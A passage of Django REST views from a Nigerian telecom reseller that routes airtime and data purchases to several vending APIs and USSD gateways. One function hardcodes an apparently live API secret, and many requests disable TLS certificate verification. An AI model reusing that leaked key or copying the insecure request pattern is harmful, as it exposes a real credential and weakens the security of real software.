 

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium =='VTUAUTO':

                                        VTUAUTO_USSD(f"{ussd}",airtel_text.vtu_auto_device_id, airtel_text.vtu_sim_slot)
                                        VTUAUTO_USSD("*123#".format(num),airtel_text.vtu_auto_device_id, airtel_text.vtu_sim_slot)
                                        status = 'successful'


                            elif Network.objects.get(name=net).data_vending_medium =='MSPLUG':
                                   Msplug_Data_vending(net,plan.msplug_plan_name_id,num,airtel_text.msplug_sim_slot,"USSD",airtel_text.msplug_device_id)
                                   status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEIFY':
                                    senddatasmeify(net,plan.smeify_plan_name_id,num,plan.month_validate)
                                    status = 'successful'

            elif net == "9MOBILE":
                            provider_source = Network.objects.get(name=net).data_vending_medium

                            mobile_text = SME_text.objects.get(network=Network.objects.get(name='9MOBILE'))
                            try:
                                ussd = plan.ussd_string.replace("n",num)
                            except:
                                ussd = ''

                            if Network.objects.get(name=net).data_vending_medium ==  "SIMHOST":
                                senddata_ussdsimhost(f"{ussd}",mobile_text.sim_host_server_id_for_data,'USSD')
                                senddata_ussdsimhost("*232#".format(num),mobile_text.sim_host_server_id_for_data,'USSD')
                                status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium ==  "SIMHOST_NG":
                                senddata_simhostng(f"{ussd}",mobile_text.sim_host_server_id_for_data,"USSD",mobile_text.vtu_sim_slot)
                                status = 'successful'
                            
                            elif Network.objects.get(name=net).data_vending_medium == "EMAIL":
                                sendmail("Order notification on yuniqtelecoms.com", f"{user.username} placed an order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num}", f"{config.gmail}", f"ADMINISTRATOR")
                                status = "processing"

                            elif Network.objects.get(name=net).data_vending_medium == "SMS FORWARDER":
                                    command = ussd
                                    sendmessage('yuniqtelecoms', f"{mobile_text.text_to_search}{command}",f"{mobile_text.number}","02")
                                    status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEPLUG':
                                    resp = senddatasmeplug("3",plan.smeplug_id,num)
                                    status = resp

                            elif Network.objects.get(name=net).data_vending_medium =='SMS':
                                    sendmessage('myweb', "{0} want to buy {1}{3}  9MOBILE-DATA data on {2} ".format(user.username, plan.plan_size, num, plan.plan_Volume), f"{config.sms_notification_number}", "02")


                            # elif Network.objects.get(name=net).data_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            #             msorg_senddata(Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                            #             status = "successful"
                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE":
                                resp = msorg_senddata(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,plan.plan_name_id)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_2":
                                resp = msorg_senddata(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,plan.plan_name_id_2)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium == "MSORG_DEVELOPED_WEBSITE_3":
                                resp = msorg_senddata(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,plan.plan_name_id_3)
                                status = resp

                            elif Network.objects.get(name=net).data_vending_medium =='VTUAUTO':
                                    VTUAUTO_USSD(f"{ussd}",mobile_text.vtu_auto_device_id,mobile_text.vtu_sim_slot)
                                    VTUAUTO_USSD("*232#".format(num),mobile_text.vtu_auto_device_id,mobile_text.vtu_sim_slot)
                                    status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='MSPLUG':
                                   Msplug_Data_vending(net,plan.msplug_plan_name_id,num,mobile_text.msplug_sim_slot,"USSD",mobile_text.msplug_device_id)
                                   status = 'successful'

                            elif Network.objects.get(name=net).data_vending_medium =='SMEIFY':
                                        senddatasmeify("ETISALAT",plan.smeify_plan_name_id,num,plan.month_validate)
                                        status = 'successful'

            elif net == 'SMILE':
                provider_source = "VTPass"

                def create_id():
                    num = random.randint(1, 10)
                    num_2 = random.randint(1, 10)
                    num_3 = random.randint(1, 10)
                    return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]

                ident = create_id()

                payload = {"billersCode": num, "serviceID": "smile-direct", "request_id": ident,"amount": plan.plan_amount, "variation_code": plan.vtpass_variation_code, "phone": num}
                authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')

                resp = requests.post( "https://vtpass.com/api/pay", data=payload, auth=authentication)
                #print(resp.text)
                status = 'successful'

            try:
                sendmail("Order notification from www.yuniqtelecoms.com", f"Your order of {net} {plan.plan_size}{plan.plan_Volume}  DATA on {num} as been placed sucessfully, and will be delivered shortly...", f"{user.email}", f"{user.username}")
            except:
                pass   

            serializer.save(Status=status, ident=ident, provider_source=provider_source, customer_ref=customer_ref, plan_amount=amount, medium='API',balance_before=previous_bal, balance_after=(previous_bal - amount))

            return Response(serializer.data, status=201)

        return Response(serializer.errors, status=400)


# airtime topup api

class AirtimeTopupAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, id, format=None):
        try:
            item = AirtimeTopup.objects.filter(user=request.user).get(pk=id)
            serializer = AirtimeTopupSerializer(item)
            return Response(serializer.data)
        except AirtimeTopup.DoesNotExist:
            return Response(status=404)


class AirtimeTopupAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        search = request.GET.get("search",None)
        if search:
            items =  AirtimeTopup.objects.filter(user=request.user).filter(Q(id__icontains=search) | Q(ident__icontains=search) | Q(mobile_number__icontains=search)).order_by('-create_date')
            serializer = DataSerializer(items, many=True)
            return Response(serializer.data)

        
        else:
            items = AirtimeTopup.objects.filter(
                user=request.user).order_by('-create_date')
            paginator = PageNumberPagination()
            result_page = paginator.paginate_queryset(items, request)
            serializer = AirtimeTopupSerializer(result_page, many=True)
            return paginator.get_paginated_response(serializer.data)

            
    def post(self, request, format=None):
        status = "processing"
        fund = 0
        serializer = AirtimeTopupSerializer(
            data=request.data, context={'request': request})

        if serializer.is_valid():
            order_username = (serializer.validated_data["user"]).username
            num = serializer.validated_data["mobile_number"]
            amt = serializer.validated_data["amount"]
            net = str(serializer.validated_data["network"])
            order_user = (serializer.validated_data["user"])
            user = serializer.validated_data["user"]
            previous_bal = order_user.Account_Balance
            airtime_type = (serializer.validated_data["airtime_type"])
            errors = {}
            provider_source = ''

            # def create_id():
            #     num = random.randint(1, 10)
            #     num_2 = random.randint(1, 10)
            #     num_3 = random.randint(1, 10)
            #     # return str(num_2)+str(num_3)+str(uuid.uuid4())[:4]
            #     return "AIRTIME"+str(num_2)+str(uuid.uuid4())[:4]
            # ident = create_id()


            def create_id():
                num = random.randint(1000, 4999)
                num_2 = random.randint(5000, 8000) 
                num_3 = random.randint(111, 999) * 2
                return str(Mdate.now().strftime("%Y%m%d%H%M%S")) + str(num) + str(num_2) + str(num_3) + str(uuid.uuid4())

            ident = create_id()




            if user.user_type == "Affilliate":
                perc = TopupPercentage.objects.get(network=Network.objects.get(name=net)).Affilliate_percent
                perc2 = TopupPercentage.objects.get(network=Network.objects.get(name=net)).share_n_sell_affilliate_percent

            elif user.user_type == "API":
                perc = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).api_percent
                perc2 = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).share_n_sell_api_percent

            elif user.user_type == "TopUser":

                perc = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).topuser_percent
                perc2 = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).share_n_sell_topuser_percent
            else:
                perc = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).percent
                perc2 = TopupPercentage.objects.get(
                    network=Network.objects.get(name=net)).share_n_sell_percent


            def senddata_ussdsimhost(ussd,servercode,mytype):
                    payload={
                        'ussd':ussd,
                        'servercode': servercode,
                        'token': f"{config.simhost_API_key}",
                        'type':mytype
                    }

                    baseurl ='https://ussd.simhosting.ng/api/ussd/?'
                    response = requests.get(baseurl,params=payload,verify=False)

            def senddata_simhostng(ussd,servercode,sim):
                response = requests.post(f"https://simhostng.com//api/ussd?apikey={config.simhost_API_key}&server={servercode}&sim={sim}&number={urllib.parse.quote(ussd)}")
                print('-------------------------- Sending Airtime to simhostng.COM ---------------------------')
                print(response.text)

            def sendairtime2(ussd,servercode,sim,msg):
                   response = requests.post(f"https://simhostng.com//api/sms?apikey={config.simhost_API_key}&server={servercode}&sim={sim}&number={ussd}&message={msg}")
                #   #print(response.text)

            def buyairtime(amount,num,code):
                headers = {'email': f'{config.ringo_email}','password': f'{config.ringo_password}','Content-Type': 'application/json' }
                payload = {
                    'serviceCode': 'VAR',
                    'amount': amount,
                    'request_id': ident,
                    'msisdn': num,
                    "product_id":code
                }
                response = requests.post('https://www.api.ringo.ng/api/agent/p2', headers=headers, data = json.dumps(payload),verify=False)
                return response

            def VTUAUTO_USSD(ussd,device_id,sim):
                    payload = {
                            "device_id":device_id,
                            "ussd_string":ussd,
                            "sim":sim}
                    response = requests.post("https://vtuauto.ng/api/v1/request/ussd", auth=HTTPBasicAuth(f'{config.vtu_auto_email}', f'{config.vtu_auto_password}'), data=payload)
                    #print(response.text)

            def sendairtime(net,num,amount):
                        url = "https://smeplug.ng/api/v1/vtu"

                        payload = json.dumps({"network_id": net,"amount":amount,"phone_number": num})

                        headers = {
                        'Content-Type': 'application/json', 'User-Agent': 'Custom', 
                        'Authorization': f'Bearer {config.sme_plug_secret_key}'
                        }

                        #print(payload)
                        response = requests.request("POST", url, headers=headers, data = payload)
                        #print(response.text)
                        return response

            def sendairtimeVtpass(net, amount, num):
                authentication = (f'{config.vtpass_email}', f'{config.vtpass_password}')

                payload = {"serviceID": net, "request_id": ident,
                           "amount": amount, "phone": num}

                response = requests.post(
                    "https://vtpass.com/api/pay", data=payload, auth=authentication)
                #print(response.text)
                return response.text

            def Msplug_AIRTIME_vending(net,amt,num,sim,rtype,device_id):
                        url = "https://www.msplug.com/api/buy-airtime/"
                        payload = {"network":net,
                                    "amount": str(amt),
                                    "phone":num,
                                    "device_id":device_id,
                                    "sim_slot":sim,
                                    "airtime_type":rtype,
                                    "webhook_url":"http://www.yuniqtelecoms.com/buydata/webhook/"
                                    }
                        headers = {
                        'Authorization': f'Token {config.msplug_API_key}',
                        'Content-Type': 'application/json'
                        }

                        response = requests.post(url, headers=headers, data = json.dumps(payload))
                        #print(response.text)

            def sendairtimesmeify(net,amt,num,airtime_type):
                    if airtime_type == "Share and Sell":
                        airtime_type = "SAS"
                    else:
                        airtime_type = "VTU"

                    headers = { 'Content-Type': 'application/json', 'User-Agent': 'Custom',  'Authorization': f'Bearer {SmeifyAuth.objects.first().get_token()}'}
                    url = "https://api.smeify.com/api/v2/airtime"
                    payload = json.dumps({
                      "network": net,
                      "amount": amt,
                      "phones": str(num),
                      "type": airtime_type
                    })
                    respons = requests.post(url, headers=headers, data=payload)

                    # headers = { 'Content-Type': 'application/json', 'User-Agent': 'Custom',  'Authorization': f'Bearer {SmeifyAuth.objects.first().get_token()}'}
                    # url = f"https://auto.smeify.com/api/v1/online/vtu?network={net}&&amount={amt}&&phone={num}"
                    # respons = requests.request("POST", url, headers=headers)

                    #print(respons.text)

            def msorg_sendairtime(netid,num,amt):

                    url = f"{config.msorg_web_url}/api/topup/"

                    headers = {
                    'Content-Type':'application/json',
                    'Authorization': f'Token {config.msorg_web_api_key}'
                    }
                    param = {"network": netid,"mobile_number": num,"amount":amt,"Ported_number":True,"airtime_type":"VTU"}
                    param_data = json.dumps(param)
                    response = requests.post(url, headers=headers, data=param_data, verify=False)
                    #print(response.text)
                    return response

            def msorg_sendairtime2(website,token,netid,num,amt):
                url = f"{website}/api/topup/"

                headers = {
                    'Content-Type':'application/json',
                    'Authorization': f'Token {token}'
                }
                param = {"network": netid,"mobile_number": num,"amount":amt,"Ported_number":True,"airtime_type":"VTU"}
                param_data = json.dumps(param)
                response = requests.post(url, headers=headers, data=param_data, verify=False)
                return response
                
            
            def ogdams_sendairtime(net_id,amt,num,airtime_type="vtu"):
                url = "https://ogdams.alwayskonnect.com/api/v1/vend/airtime"
                
                payload = json.dumps({
                    "networkId": net_id,
                    "amount": amt,
                    "phoneNumber": num,
                    "type": airtime_type,
                    "reference": ident[:10]
                })
                headers = {
                    'Authorization': 'Bearer sk_live_790e759c-0999-43ad-ba43-59cff817cd24',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                }
                
                response = requests.request("POST", url, headers=headers, data=payload)
                logging.error('------------------------------ AIRTIME TO OGDAMS')
                logging.error(f'payload = {payload}')
                logging.error(f'response = {response.text}')
                return 'successful'


            if airtime_type == 'awuf4U':
                amount = float(amt) * int(perc)/100
                check = user.withdraw(user.id, amount)
                if check == False:
                    errors['error'] = u' insufficient balance '
                    raise serializers.ValidationError(errors)
                fund = amount
                Wallet_summary.objects.create(user=order_user, product="{} {} awuf4u Airtime topup  with {} ".format(net, amt, num), amount=fund, previous_balance=previous_bal, after_balance=(previous_bal - amount))
                amt = int(amt)

                mtn_text = SME_text.objects.get(network=Network.objects.get(name='MTN'))
                Msplug_AIRTIME_vending(net,amt,num,mtn_text.msplug_sim_slot,"MTN_AWF",mtn_text.msplug_device_id)
                status = 'successful'

                provider_source = 'MSPLUG'

            elif airtime_type == "VTU":
                amount = float(amt) * int(perc)/100
                check = user.withdraw(user.id, amount)
                if check == False:
                    errors['error'] = u' insufficient balance '
                    raise serializers.ValidationError(errors)
                fund = amount
                Wallet_summary.objects.create(user=order_user, product="{} {} Airtime VTU topup  with {} ".format(net, amt, num), amount=fund, previous_balance=previous_bal, after_balance=(previous_bal - amount))


                amt = int(amt)

                provider_source = Network.objects.get(name=net).vtu_vending_medium
                
                if net == 'MTN':
                        mtn_text = SME_text.objects.get(network=Network.objects.get(name='MTN'))

                        if Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST":
                            senddata_ussdsimhost(f"*456*1*2*{amt}*{num}*1*{mtn_text.vtu_pin}#" ,mtn_text.sim_host_server_id_for_airtime,'USSD')  ## ussd simhosting
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST_NG":
                            senddata_simhostng(f"*456*1*2*{amt}*{num}*1*{mtn_text.vtu_pin}#",mtn_text.sim_host_server_id_for_airtime,mtn_text.vtu_sim_slot)
                            status = 'successful'
                            
                        elif Network.objects.get(name=net).vtu_vending_medium == 'OGDAMS':
                            resp = ogdams_sendairtime("1",amt,num)
                            status = resp

                        elif Network.objects.get(name=net).vtu_vending_medium == "RINGO":
                            buyairtime(amt,num,"MFIN-5-OR")
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEPLUG':
                            sendairtime('1',num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  MTN-TOPUP  to {num} ",f"{config.sms_notification_number}","02")

                        elif Network.objects.get(name=net).vtu_vending_medium =='VTUAUTO':

                             VTUAUTO_USSD(f"*456*1*2*{amt}*{num}*1*{mtn_text.vtu_pin}#",mtn_text.vtu_auto_device_id ,mtn_text.vtu_sim_slot)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='VTPASS':
                             sendairtimeVtpass("mtn",amt,num)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,mtn_text.msplug_sim_slot,"VTU",mtn_text.msplug_device_id)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEIFY':
                                sendairtimesmeify(net,amt,num,airtime_type)
                                status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                            msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                            msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                            status = "successful"

                        

                elif net == 'GLO':
                        try:
                            glo_text = SME_text.objects.get(network=Network.objects.get(name='GLO'))
                        except:
                            glo_text = ""

                        if Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST":
                            # MULTISTEP
                            def sendussddata(ussd,num,servercode):
                                payload={
                                    'ussd':ussd,
                                    'servercode': servercode,
                                    'multistep':num,
                                    'token': f"{config.simhost_API_key}",
                                   }

                                baseurl ="https://ussd.simhosting.ng/api/ussd/?"
                                response = requests.get(baseurl,params=payload,verify=False)
                                # print(response.text)

                            ussd = "*202*2*{1}*{0}*{2}#".format(amt,num,glo_text.vtu_pin)
                            sendussddata(f"{ussd}",'1',glo_text.sim_host_server_id_for_airtime)
                            status = 'successful'

                            # NON-MULTISTEP
                            # senddata_ussdsimhost(ussd,glo_text.sim_host_server_id_for_airtime,'USSD')
                            # status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST_NG":
                             senddata_simhostng("*202*2*{1}*{0}*{2}*1#".format(amt,num,glo_text.vtu_pin),glo_text.sim_host_server_id_for_airtime,glo_text.vtu_sim_slot)
                             status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium == "RINGO":
                            buyairtime(amt,num,"MFIN-6-OR")
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEPLUG':
                            sendairtime('4',num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  GLO-TOPUP  to {num} ",f"{config.sms_notification_number}","02")

                        elif Network.objects.get(name=net).vtu_vending_medium =='VTUAUTO':

                             VTUAUTO_USSD(f"*202*2*{num}*{amt}*{glo_text.vtu_pin}*1#",glo_text.vtu_auto_device_id ,glo_text.vtu_sim_slot)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='VTPASS':
                             sendairtimeVtpass("glo",amt,num)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,glo_text.msplug_sim_slot,"VTU",glo_text.msplug_device_id)
                             status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                            msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                            msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEIFY':
                                     sendairtimesmeify(net,amt,num,airtime_type)
                                     status = 'successful'

                elif net == 'AIRTEL':
                        airtel_text = SME_text.objects.get(network=Network.objects.get(name='AIRTEL'))

                        if Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST":
                            senddata_ussdsimhost(f"*605*2*1*{num}*{amt}*{airtel_text.vtu_pin}#",airtel_text.sim_host_server_id_for_airtime,'USSD')
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST_NG":
                            senddata_simhostng(f"*605*2*1*{num}*{amt}*{airtel_text.vtu_pin}#",airtel_text.sim_host_server_id_for_airtime,airtel_text.vtu_sim_slot) #USSD

                            # sendairtime2("432",airtel_text.sim_host_server_id_for_airtime,airtel_text.vtu_sim_slot,f'2u {num} {amt} {airtel_text.vtu_pin}')   #SMS
                            status = 'successful'
                            
                        elif Network.objects.get(name=net).vtu_vending_medium == 'OGDAMS':
                            resp = ogdams_sendairtime("2",amt,num)
                            status = resp

                        elif Network.objects.get(name=net).vtu_vending_medium == "RINGO":
                            buyairtime(amt,num,"MFIN-1-OR")
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEPLUG':
                            sendairtime('2',num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  AIRTEL-TOPUP  to {num} ",f"{config.sms_notification_number}","02")

                        elif Network.objects.get(name=net).vtu_vending_medium =='VTUAUTO':

                             VTUAUTO_USSD(f"*605*2*1*{num}*{amt}*{airtel_text.vtu_pin}#",airtel_text.vtu_auto_device_id ,airtel_text.vtu_sim_slot)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='VTPASS':
                             sendairtimeVtpass("airtel",amt,num)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,airtel_text.msplug_sim_slot,"VTU",airtel_text.msplug_device_id)
                             status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEIFY':
                                     sendairtimesmeify(net,amt,num,airtime_type)
                                     status = 'successful'
                        
                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                            msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                            msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                            status = "successful"

                elif net == '9MOBILE':
                        mobile_text = SME_text.objects.get(network=Network.objects.get(name='9MOBILE'))

                        if Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST":
                            senddata_ussdsimhost(f"*224*{amt}*{num}*{mobile_text.vtu_pin}#",mobile_text.sim_host_server_id_for_airtime,'USSD')
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium ==  "SIMHOST_NG":
                            senddata_simhostng(f"*224*{amt}*{num}*{mobile_text.vtu_pin}#",mobile_text.sim_host_server_id_for_airtime,mobile_text.vtu_sim_slot)
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium == "RINGO":
                            buyairtime(amt,num,"MFIN-2-OR")
                            status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEPLUG':
                            sendairtime('3',num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  9MOBILE-TOPUP  to {num} ",f"{config.sms_notification_number}","02")

                        elif Network.objects.get(name=net).vtu_vending_medium =='VTUAUTO':

                             VTUAUTO_USSD(f"*224*{amt}*{num}*{mobile_text.vtu_pin}#",mobile_text.vtu_auto_device_id ,mobile_text.vtu_sim_slot)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='VTPASS':
                             sendairtimeVtpass("etisalat",amt,num)
                             status = 'successful'
                        elif Network.objects.get(name=net).vtu_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,mobile_text.msplug_sim_slot,"VTU",mobile_text.msplug_device_id)
                             status = 'successful'

                        elif Network.objects.get(name=net).vtu_vending_medium =='SMEIFY':
                                     sendairtimesmeify("ETISALAT",amt,num,airtime_type)
                                     status = 'successful'
                                     
                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                            msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                            msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                            status = "successful"

                        elif Network.objects.get(name=net).vtu_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                            msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                            status = "successful"

            else:
                #print(Network.objects.get(name=net).share_and_sell_vending_medium)

                def msorg_sendairtime2(website,token,netid,num,amt):
                    url = f"{website}/api/topup/"

                    headers = {
                        'Content-Type':'application/json',
                        'Authorization': f'Token {token}'
                    }
                    param = {"network": netid,"mobile_number": num,"amount":amt,"Ported_number":True,"airtime_type":"Share and Sell"}
                    param_data = json.dumps(param)
                    response = requests.post(url, headers=headers, data=param_data, verify=False)
                    return response



                def sendairtime(net,num,amount):
                    url = "https://smeplug.ng/api/v1/vtu"

                    payload = json.dumps({
                        "network_id": net,
                        "phone_number": num,
                        "amount": amount,
                        "type": 2
                    })

                    headers = {
                    'Content-Type': 'application/json', 'User-Agent': 'Custom',
                    'Authorization': f'Bearer {config.sme_plug_secret_key}'
                    }

                    #print(payload)
                    response = requests.request("POST", url, headers=headers, data = payload)
                    #print(response.text)
                    return response


                amount = float(amt) * int(perc2)/100
                check = user.withdraw(user.id, amount)
                if check == False:
                    errors['error'] = u'Y insufficient balance '
                    raise serializers.ValidationError(errors)

                fund = amount
                Wallet_summary.objects.create(user=order_user, product="{} {} Airtime share and sell topup  with {} ".format(
                    net, amt, num), amount=fund, previous_balance=previous_bal, after_balance=(previous_bal - amount))

                amt = int(amt)
                provider_source = Network.objects.get(name=net).share_and_sell_vending_medium

                if net == 'MTN':
                    mtn_text = SME_text.objects.get(network=Network.objects.get(name='MTN'))

                    if Network.objects.get(name=net).share_and_sell_vending_medium ==  "SIMHOST":
                             senddata_ussdsimhost(f"*600*{num}*{amt}*{mtn_text.share_and_sell_pin}#", mtn_text.sim_host_server_id_for_airtime, 'USSD')
                             status = 'successful'
                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='VTUAUTO':
                             VTUAUTO_USSD(f"*600*{num}*{amt}*{mtn_text.share_and_sell_pin}#",mtn_text.vtu_auto_device_id ,mtn_text.vtu_sim_slot)
                             status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMEPLUG':
                            sendairtime('1',num,amt)
                            status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMS':
                            sendmessage('myweb',f"{user.username} want to buy  {amt} NAIRA  MTN-SHARE AND SELL  to {num} ",f"{config.sms_notification_number}","02")

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='MSPLUG':
                             Msplug_AIRTIME_vending(net,amt,num,mtn_text.msplug_sim_slot,"SNS",mtn_text.msplug_device_id)
                             status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE":
                        msorg_sendairtime2(config.msorg_web_url,config.msorg_web_api_key,Network.objects.get(name=net).msorg_web_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_2":
                        msorg_sendairtime2(config.msorg_web_url_2,config.msorg_web_api_key_2,Network.objects.get(name=net).msorg_web2_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  == "MSORG_DEVELOPED_WEBSITE_3":
                        msorg_sendairtime2(config.msorg_web_url_3,config.msorg_web_api_key_3,Network.objects.get(name=net).msorg_web3_net_id,num,amt)
                        status = "successful"

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='SMEIFY':
                                     sendairtimesmeify("MTN",amt,num,airtime_type)
                                     status = 'successful'

                    else:
                        errors['error'] = u'Share and sell not available on this network'
                        raise serializers.ValidationError(errors)

                elif net == 'AIRTEL':
                    airtel_text = SME_text.objects.get(network=Network.objects.get(name='AIRTEL'))

                    if Network.objects.get(name=net).share_and_sell_vending_medium ==  "SIMHOST":
                             senddata_ussdsimhost(f"*432*1*{num}*{amt}*{airtel_text.share_and_sell_pin}#", airtel_text.sim_host_server_id_for_airtime, 'USSD')
                             status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium  ==  "SIMHOST_NG":
                            senddata_simhostng(f"*432*1*{num}*{amt}*{airtel_text.share_and_sell_pin}#",airtel_text.sim_host_server_id_for_airtime,airtel_text.vtu_sim_slot) #USSD

                            # sendairtime2("432",airtel_text.sim_host_server_id_for_airtime,airtel_text.vtu_sim_slot,f'2u {num} {amt} {airtel_text.vtu_pin}')   #SMS
                            status = 'successful'

                    elif Network.objects.get(name=net).share_and_sell_vending_medium =='VTUAUTO':
                             VTUAUTO_USSD(f"*432*1*{num}*{amt}*{airtel_text.share_and_sell_pin}#",airtel_text.vtu_auto_device_id ,airtel_text.vtu_sim_slot)
